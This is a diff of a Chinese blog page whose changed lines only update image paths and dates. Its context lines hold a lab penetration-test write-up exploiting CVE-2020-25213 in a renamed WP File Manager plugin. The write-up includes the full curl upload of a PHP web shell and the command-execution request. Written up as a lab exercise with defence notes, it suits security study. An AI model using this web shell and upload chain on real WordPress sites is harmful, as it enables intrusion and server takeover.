@@ -26,26 +26,26 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="0x00 前言在常规的自动化渗透测试中，安全工具高度依赖目标系统的默认特征库。然而在真实的攻防场景下，防御方常通过改变默认配置（如重命名高危目录）来实施特征隐藏（Security through Obscurity），从而规避扫描。 本次实战记录了一次针对 Windows 11 平台上 WordPress 靶机的黑盒测试过程。本文详细复盘了在常规扫描器漏报的情况下，如何通过调整 Fuzzing 策">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/1.png">
-<meta property="og:image" content="http://example.com/images/2.png">
-<meta property="og:image" content="http://example.com/images/3.png">
-<meta property="og:image" content="http://example.com/images/4.png">
-<meta property="og:image" content="http://example.com/images/5.png">
-<meta property="og:image" content="http://example.com/images/6.png">
-<meta property="og:image" content="http://example.com/images/7.png">
-<meta property="og:image" content="http://example.com/images/8.png">
-<meta property="og:image" content="http://example.com/images/11.png">
-<meta property="og:image" content="http://example.com/images/9.png">
-<meta property="og:image" content="http://example.com/images/10.png">
+<meta property="og:image" content="http://example.com/images/blog1/1.png">
+<meta property="og:image" content="http://example.com/images/blog1/2.png">
+<meta property="og:image" content="http://example.com/images/blog1/3.png">
+<meta property="og:image" content="http://example.com/images/blog1/4.png">
+<meta property="og:image" content="http://example.com/images/blog1/5.png">
+<meta property="og:image" content="http://example.com/images/blog1/6.png">
+<meta property="og:image" content="http://example.com/images/blog1/7.png">
+<meta property="og:image" content="http://example.com/images/blog1/8.png">
+<meta property="og:image" content="http://example.com/images/blog1/11.png">
+<meta property="og:image" content="http://example.com/images/blog1/9.png">
+<meta property="og:image" content="http://example.com/images/blog1/10.png">
 <meta property="article:published_time" content="2026-05-10T02:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-10T07:33:23.593Z">
+<meta property="article:modified_time" content="2026-05-22T06:04:20.987Z">
 <meta property="article:author" content="smile cat">
 <meta property="article:tag" content="RCE漏洞">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="漏洞复现">
 <meta property="article:tag" content="目录爆破">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/1.png">
+<meta name="twitter:image" content="http://example.com/images/blog1/1.png">
 
 
 <link rel="canonical" href="http://example.com/2026/05/10/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E5%A4%8D%E7%9B%98%EF%BC%9A%E7%AA%81%E7%A0%B4%E9%9A%90%E8%94%BD%E7%9B%AE%E5%BD%95%E7%9A%84-WP-File-Manager-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%85%A8%E8%BF%87%E7%A8%8B/">
@@ -149,16 +149,16 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -213,9 +213,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2026-05-10 10:00:00 / 修改时间：15:33:23" itemprop="dateCreated datePublished" datetime="2026-05-10T10:00:00+08:00">2026-05-10</time>
+      <time title="创建时间：2026-05-10 10:00:00" itemprop="dateCreated datePublished" datetime="2026-05-10T10:00:00+08:00">2026-05-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-05-22 14:04:20" itemprop="dateModified" datetime="2026-05-22T14:04:20+08:00">2026-05-22</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -256,7 +262,7 @@
 <hr>
 <h2 id="0x02-侦察阶段：从扫描器漏报到目录-Fuzzing"><a href="#0x02-侦察阶段：从扫描器漏报到目录-Fuzzing" class="headerlink" title="0x02 侦察阶段：从扫描器漏报到目录 Fuzzing"></a>0x02 侦察阶段：从扫描器漏报到目录 Fuzzing</h2><p>在渗透的初始阶段，我对目标靶机进行了被动与主动的信息收集。</p>
 <h3 id="1-常规漏扫工具的盲区"><a href="#1-常规漏扫工具的盲区" class="headerlink" title="1. 常规漏扫工具的盲区"></a>1. 常规漏扫工具的盲区</h3><p>针对 WordPress 架构，业界通常首选 WPScan 进行被动枚举。但在本次针对性扫描中，工具并未检出任何高危插件：</p>
-<p><img src="/images/1.png" alt="WPScan 扫描结果漏报"></p>
+<p><img src="/images/blog1/1.png" alt="WPScan 扫描结果漏报"></p>
 <p><strong>技术分析</strong>：WPScan 的插件枚举逻辑主要依赖于发送 HTTP 请求探测 <code>/wp-content/plugins/[插件原生名称]/</code> 路径。一旦防御者重命名了该目录（即改变了 Plugin Slug），基于静态规则库的传统扫描器便会完全失效。</p>
 <h3 id="2-引入目录模糊测试-Fuzzing"><a href="#2-引入目录模糊测试-Fuzzing" class="headerlink" title="2. 引入目录模糊测试 (Fuzzing)"></a>2. 引入目录模糊测试 (Fuzzing)</h3><p>确认静态扫描失效后，我转而使用 <code>dirsearch</code> 对插件目录进行路径模糊测试，试图通过暴力枚举找出被隐藏的业务文件夹。</p>
 <p>为了提高探测精度并规避基础的 WAF 拦截，我配置了以下探测参数：</p>
@@ -268,9 +274,9 @@
 <p>执行命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.213/wordpress/wp-content/plugins/ -e php,txt,zip,bak -f --random-agent</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/2.png" alt="Dirsearch 默认字典配置"></p>
+<p><img src="/images/blog1/2.png" alt="Dirsearch 默认字典配置"></p>
 <p>然而，第一轮基于默认字典（包含 23635 个常用目录名）的扫描并未达到预期效果。终端输出了大量 <code>403 Forbidden</code> 以及 <code>301 Moved Permanently</code> 状态码：</p>
-<p><img src="/images/3.png" alt="Dirsearch 扫描日志降噪分析"></p>
+<p><img src="/images/blog1/3.png" alt="Dirsearch 扫描日志降噪分析"></p>
 <p><strong>深度研判：如何排除假阳性（False Positives）干扰？</strong><br>面对满屏红色的 403 和 301 状态码，如果不加甄别极易陷入“假阳性”陷阱。为确认第一轮扫描是否真正无果，我通过以下两个底层维度对海量日志进行了严格的降噪排查：</p>
 <ol>
 <li><p><strong>基于触发特征的 403 拦截甄别</strong>：<br>日志中大量出现的 403 报错（如针对 <code>%C0%AE%C0%AE%C0%AF</code> 等 URL 编码变体的探测），并非意味着存在此类奇葩目录。这是因为扫描器的 Payload 携带了明显的“目录穿越（Directory Traversal）”恶意特征，在抵达业务层前，直接触发了目标服务器底层的安全规则（WAF&#x2F;Apache 防护）而被强制阻断。这些响应纯属“规则拦截噪音”。</p>
@@ -283,9 +289,9 @@
 <p>通过挂载定制字典重新发起请求：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.31.213/wordpress/wp-content/plugins/ -e php,txt,zip,bak -f --random-agent -w raft-large-directories.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/4.png" alt="挂载定制字典进行探测"></p>
+<p><img src="/images/blog1/4.png" alt="挂载定制字典进行探测"></p>
 <p>在高质量字典的碰撞下，服务器防线出现破局点。扫描日志中成功捕获到了针对非标准目录 <code>/bomb/</code> 的异常状态码：</p>
-<p><img src="/images/5.png" alt="成功锁定隐蔽目录 bomb"></p>
+<p><img src="/images/blog1/5.png" alt="成功锁定隐蔽目录 bomb"></p>
 <p>至此，通过 Fuzzing 策略的调整，我成功从黑盒状态下锁定了被管理员隐蔽重命名的高危组件目录位置，外围防线已被撕裂。</p>
 <hr>
 <h2 id="0x03-漏洞利用：指纹识别与系统接管"><a href="#0x03-漏洞利用：指纹识别与系统接管" class="headerlink" title="0x03 漏洞利用：指纹识别与系统接管"></a>0x03 漏洞利用：指纹识别与系统接管</h2><p>锁定了 <code>/bomb/</code> 目录后，接下来的核心任务是确认该隐蔽组件的真实身份，并寻找可利用的攻击面。</p>
@@ -293,18 +299,18 @@
 <p>我利用 <code>curl</code> 构造了轻量级的 HTTP GET 探针，尝试读取该目录下的说明文件，以期获取组件的版本指纹：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://192.168.31.213/wordpress/wp-content/plugins/bomb/readme.txt | <span class="built_in">head</span> -n 10</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/6.png" alt="组件指纹识别：通过 readme.txt 提取元数据"></p>
+<p><img src="/images/blog1/6.png" alt="组件指纹识别：通过 readme.txt 提取元数据"></p>
 <p><strong>情报确认</strong>：探针成功返回了数据。通过提取头部元数据（Metadata），我确认了这个被管理员重命名为 <code>bomb</code> 的隐蔽目录，其真实身份是 <strong>WP File Manager</strong> 插件，且当前运行版本为 <strong>6.0</strong>。<br>结合开源威胁情报（OSINT）及 CVE 漏洞库检索，确认该版本存在极其严重且易被利用的远程代码执行漏洞（CVE-2020-25213）。</p>
 <h3 id="2-漏洞定级与载荷锻造-Payload-Crafting"><a href="#2-漏洞定级与载荷锻造-Payload-Crafting" class="headerlink" title="2. 漏洞定级与载荷锻造 (Payload Crafting)"></a>2. 漏洞定级与载荷锻造 (Payload Crafting)</h3><p>CVE-2020-25213 的成因在于，WP File Manager 底层依赖了开源的 <code>elFinder</code> 文件管理器组件。开发者在发布正式版时，严重疏忽地将一个用于本地测试的无鉴权接口文件（<code>connector.minimal.php.dist</code>）去除了 <code>.dist</code> 后缀。这导致任何人都可以通过该接口直接调用底层的 C 端文件操作 API。</p>
 <p>在明确了攻击链路后，我选择在本地手工锻造一个极简的 PHP 一句话木马（WebShell），而非依赖 MSF 等重量级框架，以保障载荷的纯净度与隐蔽性：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; payload.php</span><br><span class="line"><span class="built_in">cat</span> payload.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/7.png" alt="本地构造极简 PHP 一句话木马"></p>
+<p><img src="/images/blog1/7.png" alt="本地构造极简 PHP 一句话木马"></p>
 <p>此 Payload 将利用 PHP 底层的 <code>system()</code> 函数，直接向目标宿主机的操作系统下发指令，并通过 HTTP GET 方法的 <code>cmd</code> 参数进行动态接收。</p>
 <h3 id="3-基于-elFinder-API-的后门投递"><a href="#3-基于-elFinder-API-的后门投递" class="headerlink" title="3. 基于 elFinder API 的后门投递"></a>3. 基于 elFinder API 的后门投递</h3><p>漏洞利用阶段，我规避了常规的图形化上传，直接使用 <code>curl</code> 模拟浏览器底层行为，向存在缺陷的 <code>connector.minimal.php</code> 接口发送 Multipart 表单数据包。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F <span class="string">&quot;cmd=upload&quot;</span> -F <span class="string">&quot;target=l1_Lw&quot;</span> -F <span class="string">&quot;upload[]=@payload.php&quot;</span> http://192.168.31.213/wordpress/wp-content/plugins/bomb/lib/php/connector.minimal.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/8.png" alt="构造 Multipart 数据包完成木马投递"></p>
+<p><img src="/images/blog1/8.png" alt="构造 Multipart 数据包完成木马投递"></p>
 <p><strong>数据包构造的底层硬核解析</strong>：</p>
 <ul>
 <li><strong><code>cmd=upload</code> &amp; <code>target=l1_Lw</code></strong>：这是 <code>elFinder</code> 底层 API 的特定语法。<code>l1_Lw</code> 是插件工作根目录经过 Base64 变种编码后的标识符。该指令强制底层引擎将文件写入指定的高权限目录。</li>
@@ -313,7 +319,7 @@
 <p>如截图所示，服务器返回了详细的 JSON 响应。其中的 <code>&quot;name&quot;:&quot;payload.php&quot;</code> 及暴露的物理路径证明，WebShell 已成功突破防线，硬着陆于目标磁盘。</p>
 <hr>
 <h2 id="0x04-防御对抗：终端安全策略带来的挑战"><a href="#0x04-防御对抗：终端安全策略带来的挑战" class="headerlink" title="0x04 防御对抗：终端安全策略带来的挑战"></a>0x04 防御对抗：终端安全策略带来的挑战</h2><p>在尝试通过 <code>curl</code> 投递 Payload 的第一回合，攻击链路意外中断。尽管 Web 层的响应显示上传逻辑已触发，但目标宿主机的端点防护系统（Windows Defender）瞬间发出了红色预警：</p>
-<p><img src="/images/11.png" alt="Windows Defender 实时拦截截图"></p>
+<p><img src="/images/blog1/11.png" alt="Windows Defender 实时拦截截图"></p>
 <p><strong>深度防御行为分析：</strong><br>通过对拦截日志（图 11）的复盘，可以提取出两个关键的攻防情报：</p>
 <ol>
 <li><strong>静态特征码识别</strong>：Defender 将本次投递的载荷精准识别为 <code>Backdoor:PHP/Perhetshell.A!dha</code>。这证明即使是极简的 <code>system()</code> 函数调用，在现代 AV 引擎的静态特征库中也属于“高度敏感”级别的黑名单。</li>
@@ -324,12 +330,12 @@
 <h2 id="0x05-RCE-触发与后渗透信息收集"><a href="#0x05-RCE-触发与后渗透信息收集" class="headerlink" title="0x05 RCE 触发与后渗透信息收集"></a>0x05 RCE 触发与后渗透信息收集</h2><p>木马落地后，Web 应用的边界已被彻底击穿。为了验证操作系统级别的控制权，并为可能的内网横向移动（Lateral Movement）收集情报，我向预置的木马接口发送了 <code>ipconfig</code> 指令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://192.168.31.213/wordpress/wp-content/plugins/bomb/lib/files/payload.php?cmd=ipconfig&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/9.png" alt="触发 RCE 执行 ipconfig (暴露系统跨平台字符集碰撞)"></p>
+<p><img src="/images/blog1/9.png" alt="触发 RCE 执行 ipconfig (暴露系统跨平台字符集碰撞)"></p>
 <p>执行后，终端成功捕获了目标 Windows 宿主机的网络拓扑信息。但此时出现了一个典型的<strong>跨平台字符编码碰撞</strong>现象：目标机为中文 Windows，底层 CMD 输出采用 <strong>GBK (CP936)</strong> 编码，而攻击机 Kali 终端默认采用 <strong>UTF-8</strong> 解析，导致中文字段呈现乱码。</p>
 <p>为了保障渗透战报的规范性与可读性，我利用 Linux 原生的管道符结合 <code>iconv</code> 工具，在数据流回显的瞬间进行了底层的强制转码解码：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://192.168.31.213/wordpress/wp-content/plugins/bomb/lib/files/payload.php?cmd=ipconfig&quot;</span> | iconv -f GBK -t UTF-8</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/10.png" alt="通过 iconv 进行底层编码转换重构标准输出"></p>
+<p><img src="/images/blog1/10.png" alt="通过 iconv 进行底层编码转换重构标准输出"></p>
 <p><strong>战果研判（极其重要的后渗透发现）</strong>：<br>通过完美的标准输出，我不但取得了最高级别的命令执行权限，更在网络拓扑中发现了重大情报。目标宿主机除了暴露在 <code>192.168.31.0/24</code> 网段外，其底层还秘密运行着 <code>singbox_tun (172.18.0.2)</code> 代理隧道以及 <code>Radmin VPN (26.226.78.169)</code> 虚拟局域网。<br>在真实的红蓝对抗中，这几个隐藏的虚拟网卡将成为攻击者跳出当前隔离区，向内网深处进行隐蔽穿透的绝佳跳板。</p>
 <hr>
 <h2 id="0x05-总结与防御建议"><a href="#0x05-总结与防御建议" class="headerlink" title="0x05 总结与防御建议"></a>0x05 总结与防御建议</h2><p>本次黑盒渗透完整验证了“隐蔽式安全”的脆弱性。防御者试图通过重命名插件目录来规避自动化扫描，但这在具有针对性字典的 Fuzzing 攻击下形同虚设。最终，凭借对组件指纹的精准识别以及对 Web 容器底层数据处理逻辑（数组强制传参）的理解，成功突破了目标防线。</p>
@@ -360,6 +366,15 @@
 
         
 
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/05/22/HawkEye-Scanner%EF%BC%9A%E7%BA%AF%E7%A6%BB%E7%BA%BF%20JWT%20%E5%BC%B1%E5%AF%86%E9%92%A5%E9%AB%98%E5%B9%B6%E5%8F%91%E6%8E%A2%E6%B5%8B%E5%99%A8/" rel="next" title="构建高可用 JWT 审计工具：HawkEye-Scanner 底层架构与并发实践">
+                  构建高可用 JWT 审计工具：HawkEye-Scanner 底层架构与并发实践 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
     </footer>
   </article>
 </div>
